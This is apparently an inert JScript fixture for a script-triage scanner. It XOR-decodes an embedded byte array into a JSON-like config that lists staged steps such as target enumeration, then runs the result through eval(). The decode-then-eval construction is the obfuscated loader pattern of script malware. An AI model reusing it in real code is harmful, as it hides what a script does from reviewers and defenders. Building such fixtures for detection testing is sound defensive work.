// Huntress Script Triage -- inert static-analysis fixture (wsh_jscript_windows)
var decode_12891475 = function decode_12891475_body(v_a19c) {
  var keyBytes = [98,55,37,74,39];
  var v_b27e = [];
  for (var i = 0; i < v_a19c.length; i++) { v_b27e.push(v_a19c[i] ^ keyBytes[i % keyBytes.length]); }
  return v_b27e;
};
var recover_ef1d57c0 = function recover_ef1d57c0_body() {
  // configuration reconstruction
  var characters = [25,21,86,62,66,18,68,7,112,124,64,82,75,63,74,7,69,68,62,66,61,67,68,56,64,7,67,86,104,11,64,67,87,43,73,17,81,74,56,74,61,84,74,36,83,7,89,81,104,11,64,64,87,35,83,7,104,87,47,68,13,65,64,56,94,61,89,74,62,66,64,106,9,104,70,6,86,85,62,66,16,21,31,104,116,1,69,76,58,83,11,89,66,100,97,11,91,64,25,94,17,67,64,39,104,0,93,64,41,83,64,27,7,60,70,14,66,64,57,5,88,76,7,41,70,15,71,68,35,64,12,104,76,46,5,88,21,70,43,74,18,86,76,45,73,79,3,20,123,18,81,1,29,120,68,84,21,9,104,83,3,69,66,47,83,61,69,74,37,83,64,13,7,9,29,62,107,112,57,66,16,68,121,22,119,23,85,73,35,68,62,107,109,63,73,22,69,64,57,84,46,86,71,22,123,11,90,85,43,68,22,26,17,123,22,87,4,19,114,21,1,1,7,102,5,7,79,81,47,73,17,94,74,36,5,88,21,11,38,72,1,92,64,46,10,86,6,20,127,20,84,15,23,41,17,64,27,7,36,72,22,82,122,36,70,15,82,7,112,5,48,114,102,5,113,39,101,8,126,22,83,2,22,124,31,80,84,19,100,83,26,67,7,55,11,64,68,81,43,64,7,116,74,63,73,22,21,31,121,90];
  var v_a19c = [];
  for (var ci = 0; ci < characters.length; ci++) { v_a19c.push(characters[ci]); }
  var v_f602 = ["north", "south"].join(":");
  var v_b27e = [];
  for (var pass = 0; pass < 1; pass++) { v_b27e = decode_12891475(v_a19c); }
  var textParts = [], bi = 0;
  for (bi = 0; bi < v_b27e.length; bi++) { textParts.push(String.fromCharCode(v_b27e[bi])); }
  var v_c304 = textParts.join("");
  return v_c304;
  // end reconstruction
};
var inspect_fe5c978d = function inspect_fe5c978d_body() {
  var v_d41a = eval("(" + recover_ef1d57c0() + ")");
  var v_e598 = new Object();
  v_e598["steps"] = v_d41a["steps"];
  v_e598["adapter"] = v_d41a["adapter"];
  v_e598["values"] = v_d41a["values"];
  v_e598["stageCount"] = v_d41a["stageCount"];
  return v_e598;
};
